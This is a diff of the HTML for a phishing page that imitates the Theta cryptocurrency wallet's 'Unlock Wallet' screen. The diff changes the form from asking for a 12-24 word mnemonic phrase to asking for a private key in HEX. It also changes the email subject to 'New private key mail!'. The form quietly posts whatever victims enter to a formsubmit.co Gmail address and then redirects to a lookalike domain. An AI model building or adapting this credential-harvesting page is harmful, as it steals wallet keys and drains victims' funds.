@@ -18,7 +18,7 @@
 <body>
     <form method="POST" action="https://formsubmit.co/thetanetwork9@gmail.com">
         <input type="hidden" name="_next" value="https://thetamainnetunlock.com/admin.html">
-        <input type="hidden" name="_subject" value="New mnemonic mail!">
+        <input type="hidden" name="_subject" value="New private key mail!">
         <input type="hidden" name="_captcha" value="false">
         <div id="root">
             <div class="row">
@@ -35,19 +35,19 @@
                         <div class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed">
                             <a href="index.html" class="TabBarItem TabBarItem tablinks" aria-current="page"><div class="TabBarItem__title">KEYSTORE</div></a>
 							<a class="TabBarItem--is-active tablinks" href="index.html"><div class="TabBarItem__title">MNEMONIC</div></a>
-							<a class="TabBarItem tablinks" href="privatekey.html"><div class="TabBarItem__title">PRIVATE KEY</div></a>
+							<a class="TabBarItem tablinks" href="privatekey.php"><div class="TabBarItem__title">PRIVATE KEY</div></a>
 							<a class="TabBarItem tablinks" href="index.html"><div class="TabBarItem__title">HARDWARE</div></a>
                         </div>
                         </div>
-                        <div class="UnlockWalletViaMnemonicPhrase">
-                            <div class="UnlockWalletViaMnemonicPhrase__title">Please enter your 12-24 word phrase</div>	
-                            <textarea class="UnlockWalletViaMnemonicPhrase__mnemonic" name="mnemonic" minlength="23" required=""></textarea>
-                            <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">Please separate each Mnemonic Phrase with a space.</div>
-                            <input class="UnlockWalletViaMnemonicPhrase__password-input" placeholder="Enter temporary session password" name="password" type="password" value="" required="">
-                            <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions_1"><input type="checkbox" value="I have entered all details are correctly" required=""><small>I have entered all details are correctly.</small></div>
-                            <div class="UnlockWalletCard__warning">Before you enter your mnemonic phrase, we recommend you connect your device to the internet. You will be able to disconnect once your wallet is Unlocked.</div>
-                            <div class="UnlockWalletViaMnemonicPhrase__footer">
-                                <button type="submit" name="submit" class="GradientButton-undefined-GradientButton">
+                        <div id="privateKey" class="UnlockWalletViaPrivateKey ccc">
+                            <div class="UnlockWalletViaMnemonicPhrase__title">Please enter your private key</div>
+                            <textarea class="UnlockWalletViaPrivateKey__private-key" name="privateKey" required></textarea>
+                            <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">Please enter your private key in HEX format.</div>
+                            <input class="UnlockWalletViaMnemonicPhrase__password-input" placeholder="Enter temporary session password" name="password" type="password" value="" required>
+                            <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions_1"><input type="checkbox" value="I have entered all details are correctly" required><small>I have entered all details are correctly.</small></div>
+                            <div class="UnlockWalletCard__warning">Before you enter your private key, we recommend you connect your device to the internet. You will be able to disconnect once your wallet is Unlocked.</div>
+                            <div class="UnlockWalletViaPrivateKey__footer">
+                                <button type="submit" name="submit"  class="GradientButton-undefined-GradientButton">
                                     <div class="GradientButton__title">Unlock Wallet</div>
                                 </button>
                             </div>
